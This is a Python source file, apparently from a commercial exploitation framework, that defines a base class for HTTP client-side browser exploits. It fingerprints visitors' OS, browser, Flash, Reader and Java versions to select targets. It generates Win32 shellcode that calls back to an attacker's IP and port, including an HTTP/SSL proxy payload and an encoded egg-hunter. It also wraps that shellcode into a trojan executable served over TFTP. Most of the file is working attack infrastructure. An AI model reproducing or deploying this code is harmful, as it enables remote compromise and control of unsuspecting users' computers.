#! /usr/bin/env python
"""
    httpclientside.py

    HTTP Client side exploit that works with httpserver (derivated from tcpexploit)
"""

from __future__ import with_statement

import os,getopt
import sys
import re
import socket
from exploitutils import *

from shellcode import shellcodeGenerator

from tcpexploit import tcpexploit
from encoder import chunkedaddencoder

from threading import RLock
from libs.tftpy import *
from libs.ua_parser import user_agent_parser

class httpclientside(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.UserAgent = [ ]
        self.searchMethod = self.AcceptAll
        self.cangzip=1
        self.datatype="binary/octet-stream"
        self.mimetype = None
        self.plugin_info = None #needed for all http client sides from clientd :>
        self.supports_dns_mosdef = False # exploit will set this to True if it supports DNS payload
        #shellcode options
        self.DNSMOSDEF = False # Updated by clientd
        self.HTTPMOSDEF = False
        self.move_to_stack = False
        self.searchcode_vprotect = True
        self.searchcode_mod_stack = True
        #two more options for non-searchcode Win32 shellcode
        self.vProtect = False
        self.vAlloc = False
        #set this to true to use SSL MOSDEF
        self.useSSLMOSDEF = False

        #end shellcode options
        #set this if your exploit doesn't have room for http mosdef and you can't get searchcode working. :<
        self.nohttpmosdef = False

        self.tftpd = None
        self.tftpd_lock=RLock()


    def done(self):
        """
        This is where you turn off all your servers and things you've set up
        This is a stub in this object. Overload it in your exploit
        if you need to.
        """
        devlog("httpclientside", "Done() called. Stub.")

    def is_windows(self, info_dict):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])
        if 'Windows' in parsed['os']['family']:
            return True
        else:
            return False

    def is_x86(self, info_dict):
        if "plugins" not in info_dict:
            return False

        arch = info_dict['plugins']['CPU']
        if arch == 'x86':
            return True
        else:
            return False

    def is_x64(self, info_dict):
        if "plugins" not in info_dict:
            return False

        arch = info_dict['plugins']['CPU']
        if arch == 'x64':
            return True
        else:
            return False

    def getFlashVersion(self, info_dict):
        """
        Returns the versions of Flash used or None, None, None, None
        """
        if not info_dict:
            return None, None, None, None

        if "plugins" not in info_dict:
            return None, None, None, None

        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )

            if match:
                flash_version  = match.group(0)
            else:
                return None, None, None, None

            version_list = flash_version.split(".")

            try:
                major = int(version_list[0])
            except IndexError, ValueError:
                major = 0

            try:
                minor = int(version_list[1])
            except IndexError, ValueError:
                minor = 0

            try:
                build = int(version_list[2])
            except IndexError, ValueError:
                build = 0

            try:
                patch = int(version_list[3])
            except IndexError, ValueError:
                patch = 0

            return major, minor, build, patch

        else:
            return None, None, None, None


    def getReaderVersions(self, info_dict):
        """
        Returns the versions of reader used or None, None, None, None

        Note: Adobe changed their Firefox plugin name from 8 to 9, so theoretically
        we can tell they ARE running 9 if on Firefox 3.5. However, we can't tell
        minor/build/patch so we ignore this.

        On Firefox 3.0, we get the version from the mimeType.enabledPlugin object.
        """

        #some quick bug-checking
        if not info_dict:
            return None, None, None, None
        if "plugins" not in info_dict:
            return None, None, None, None

        if "IE Adobe Reader" in info_dict['plugins']:
            reader          = info_dict['plugins']['IE Adobe Reader']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, reader )

            # If there's no match it will throw an exception
            try:
                reader_version  = match.group(0)
            except Exception:
                return None, None, None, None

            version_list = reader_version.split(".")

            try:
                major = int(version_list[0])
            except IndexError, ValueError:
                major = 0

            try:
                minor = int(version_list[1])
            except IndexError, ValueError:
                minor = 0

            try:
                build = int(version_list[2])
            except IndexError, ValueError:
                build = 0

            try:
                patch = int(version_list[3])
            except IndexError, ValueError:
                patch = 0

        elif 'Mimetype Acrobat Reader' in info_dict["plugins"].keys():
            reader_version=info_dict["plugins"]['Mimetype Acrobat Reader']
            try:
                major,minor,build,patch = reader_version.split(".")
            except:
                return None, None, None, None
        else:
            return None, None, None, None
        devlog("clientd","Reader: %s, %s, %s, %s"%(major,minor, build,patch))
        return int(major), int(minor), int(build), int(patch)
        
    def clientd_init(self):
        """
        Runs once when an exploit is selected for a ClientD run. Initializing
        servers and other expensive tasks that should be done on a per module
        and NOT per-client basis should be done here.
        """
        return

    def getJavaVersions(self, info_dict):
        """
        Gets the java plugin versions
        """
        #some quick bug-checking
        if not info_dict:
            return None, None, None, None
        if "plugins" not in info_dict:
            return None, None, None, None

        if "Java" in info_dict['plugins']:
            java          = info_dict['plugins']['Java']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, java )

            # If there's no match it will throw an exception
            try:
                java_version  = match.group(0)
            except:
                return None, None, None, None

            version_list = java_version.split(".")
            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            try:
                patch = int(version_list[3])
            except IndexError:
                patch = 0
            return major,minor,build,patch
        return None,None,None,None

    def isWindowsXP(self, info_dict):
        """
        We can get the fact that they are Windows XP many different ways -
        1. Java detection
        2. User-Agent
        3. Javascript detection
        4. .Net/Flash
        """
        user_agent = info_dict.get('user_agent',"")
        if "Java" in info_dict['plugins']:
            #this is the most reliable
            java          = info_dict['plugins']['Java']
            if "Windows XP" in java:
                devlog("httpclientside", "Found OS to be XP using Java applet")
                return True
        if "Windows NT 5.1" in user_agent:
            devlog("httpclientside", "Found OS to be XP using User_Agent")
            return True
        devlog("httpclientside", "Not sure that the OS is XP!")
        return False


    def registerWebDavDirectory(self, share_name):
        """
        We need to tell clientd to forward all requests to this share to us!
        """
        if not hasattr(self, "sessionstate") or not self.sessionstate:
            self.log("Error: No session state - not running from clientd!")
            return False

        ret = self.sessionstate.registerWebDavDirectory(share_name)
        if not ret:
            self.log("Failed registering %s as our web dav directory!"%share_name)
        return ret #false on failure

    def getServerPort(self):
        """
        A simple helper routine to get the port the http server is listening on.
        This obviously only works through clientd!
        """
        if not hasattr(self, "sessionstate") or not self.sessionstate:
            self.log("Error: No session state - not running from clientd!")
            return None

        return self.sessionstate.loader.canvasobj.server_port

    def createWin32ClientSideShellcode(self, win8_compatible=False):
        """
        Creates a standard Universal Win32 client-side callback shellcode
        """
        host = self.callback.ip
        port = self.callback.port
        self.log("Shellcode calling back to %s:%d"%(host, port))
        proxy_payload = ''

        if self.HTTPMOSDEF and not self.nohttpmosdef:
            import shellcode.standalone.windows.payloads as payloads
            p   = payloads.payloads()
            sc  = p.http_proxy(host, port, SSL=self.useSSLMOSDEF)

            proxy_payload = p.assemble(sc)
            self.log('HTTP MOSDEF payload size: %d bytes' % len(proxy_payload))
            self.log('HTTP MOSDEF callback IP: %s PORT: %s SSL: %s' % (host, port, self.useSSLMOSDEF))
        else:
            self.log("Using TCP callback shellcode (%s:%d)"%(host,port))

        self.shellcode = self.createInjectToSelf(host, port,\
                                               injectme=proxy_payload,\
                                               movetostack=self.move_to_stack,
                                               universal=True,
                                               vProtect=self.vProtect,
                                               win8_compatible=win8_compatible,
                                               vAlloc=self.vAlloc)
        if len(self.shellcode) % 2:
            self.shellcode += 'A'

        self.log("Length of shellcode: %s"%len(self.shellcode))

        return self.shellcode

    def createSearchcode(self):
        sc = shellcodeGenerator.win32()
        sc.addAttr('SearchCodeSafeSEH', {'tag' : self.tag,
                                         'vprotect' : self.searchcode_vprotect,
                                         'mod_stack' : self.searchcode_mod_stack
                                         }
                   )
        sc.standalone = 1

        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)

        self.searchcode = encoder.encode(sc.get())

        self.log("Using SearchCodeSafeSEH. Length %d" % len(self.searchcode))
        return self.searchcode

    def createWin32ClientsideSearchShellcode(self):
        self.tag_str = '\xCA\xFE\xBE\xEF'
        self.tag = struct.unpack('<L', self.tag_str)[0]

        self.createSearchcode()
        self.createWin32ClientSideShellcode()
        self.shellcode = self.tag_str + self.shellcode
        return

    def clientSideListenerTypes(self):
        """
        These are always the same.
        """
        import canvasengine

        if self.DNSMOSDEF: return [canvasengine.DNSMOSDEF]

        #sad but sometimes the case (see ie_peers_setattribute)
        if self.nohttpmosdef:
            return [canvasengine.UNIVERSAL_MOSDEF]

        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPSMOSDEF]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
        devlog("httpclientside: Should never get here!")
        return ["ERROR"]

    def createShellcode(self):
        return self.createWin32ClientSideShellcode()

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()


    ###############################3
    #TFTPD Functions
    def set_up_tftp_server(self):
        """
        Returns False if could not set up the TFTPD server, otherwise, returns the TFTPD object
        """
        self.log("building the MOSDEF trojan")

        shellcode = self.createShellcode()

        #use pelib to build the universal callback shellcode into a trojan .exe
        from MOSDEF import pelib
        pe = pelib.PElib()
        self.mosdeftrojan = pe.createPEFileBuf(shellcode)

        self.log("Starting up tftp server")
        try:
            myServer = TftpServer(allfiles=self.mosdeftrojan)
            myServer.listen()
        except Exception,msg:
            self.log("Failed to set up TFTPD: %s"%msg)
            return False

        return myServer

    def check_tftpd(self):
        """
        This is what's run in a thread
        """

        while not self.state == self.HALT:
            with self.tftpd_lock:
                if not self.tftpd:
                    #done() was called
                    break
                readyinput=self.tftpd.check_sockets()
                self.tftpd.handle_active_sockets()

        self.log("Halted TFTPD")
        return

    def shutdown_tftpd(self):
        """
        Turns off TFTPD so another exploit can use it.
        Called from done() function usually.
        """
        with self.tftpd_lock:
            if self.tftpd:
                self.log("Shutting down our TFTPD")
                self.tftpd.close()
                self.tftpd=None

    #end TFTPD functions
    ##########################

    def AcceptAll(self, useragent):
        self.log("Accepting any useragent: %s"%prettyprint(useragent))
        return 1

    def SearchBrowserType(self, useragent):
        self.log("Searching browser type for %s"%(str(useragent)))
        (type, version) = self.getBrowser(useragent)
        if not type and not version:
            return 0
        type=type.replace(" ","")
        #print "Type=%s"%type
        self.log("Browser type=%s"%type)
        for a in self.UserAgent:
            if a == type:
                return 1
        return 0

    def SearchBrowserVersion(self, useragent):
        self.log("Searching browser version")
        (type, version) = self.getBrowser(useragent)
        if not type and not version:
            return 0
        version=version.replace(" ","") #ignore spaces here
        self.log("Target version: %s"%version)
        for a in self.UserAgent:
            if a == version:
                return 1
        return 0

    def CmpAnyTag(self, useragent):
        self.log("Comparing any tag: %s"%prettyprint(useragent))
        (browser, tags, extrainfo) = useragent
        for a in self.UserAgent:
            if a == tags:
                return 1
        return 0

    def CmpBrowser_CmpAnyTag_CmpExtraInfo(self, useragent):
        self.log("CmpBrowser_CmpAny_CmpExtraInfo %s"%useragent)
        (browser, tags, extrainfo) = useragent

        for a in self.UserAgent:
            (a_type, a_tag, a_extrainfo) = a
            if browser == a_type and extrainfo == a_extrainfo and a_tag in tags:
                return 1
        return 0

    def CmpBrowser_FindAnyTag_CmpExtraInfo(self, useragent):
        (browser, tags, extrainfo) = useragent

        for a in self.UserAgent:
            (a_type, a_tag, a_extrainfo) = a
            if browser == a_type and extrainfo == a_extrainfo:
                for a in tags:
                    if a.find(a_tag)>-1:
                        return 1
        return 0

    def FindBrowser_FindAnyTag_CmpExtraInfo(self, useragent):
        # XXX: fix for init from CheckUserAgent("") httpserver.py
        if useragent == "":
            return 0
        if len(useragent)<3:
            return 0
        (browser, tags, extrainfo) = useragent

        for a in self.UserAgent:
            #print "Useragent value: %s"%str(a)
            (a_type, a_tag, a_extrainfo) = a
            if browser.find(a_type) > -1 and extrainfo == a_extrainfo:
                for a in tags:
                    #print "Tag: %s"%a
                    if a.find(a_tag)>-1:
                        return 1
                    #print "Tag %s not found in %s"%(a, a_tag)
        return 0


    def CmpAnyTags(self, useragent):
        self.log("CmpAnyTags")
        (browser, tags, extrainfo) = useragent

        for a in self.UserAgent:
            if a in tags:
                return 1
        return 0

